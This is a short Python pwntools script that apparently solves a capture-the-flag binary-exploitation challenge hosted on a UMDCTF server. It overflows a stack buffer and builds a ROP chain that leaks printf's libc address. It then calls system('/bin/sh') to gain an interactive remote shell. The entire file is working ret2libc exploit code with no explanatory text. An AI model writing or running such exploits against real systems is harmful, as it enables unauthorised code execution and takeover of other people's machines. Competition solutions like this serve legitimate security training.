import time

from pwn import *

if __name__ == "__main__":
    context.arch = "amd64"
    
    #io = process("./JNW")
    io = remote("chals5.umdctf.io", 7004)
    io.recvuntil("?\n")

    offset = 0x48
    ret = p64(0x0040101a)
    pop_rdi = p64(0x004012c3)
    printf_got = p64(0x00404028)
    printf = p64(0x00401090)
    main = p64(0x0040120b)
    
    bin_sh_offset = 0x14eeaa
    system_offset = -0x15a20

    payload = b"A" * offset
    payload += ret
    payload += pop_rdi
    payload += printf_got
    payload += printf
    payload += main

    io.sendline(payload)
    time.sleep(0.5)
    res = io.recv(1024)
    printf_libc = u64(res[:6].ljust(8, b"\x00"))
    
    bin_sh = p64(printf_libc + bin_sh_offset)
    system = p64(printf_libc + system_offset)

    payload = b"A" * offset
    payload += pop_rdi
    payload += bin_sh
    payload += system

    io.sendline(payload)
    time.sleep(0.5)
    
    io.interactive()
    io.close()
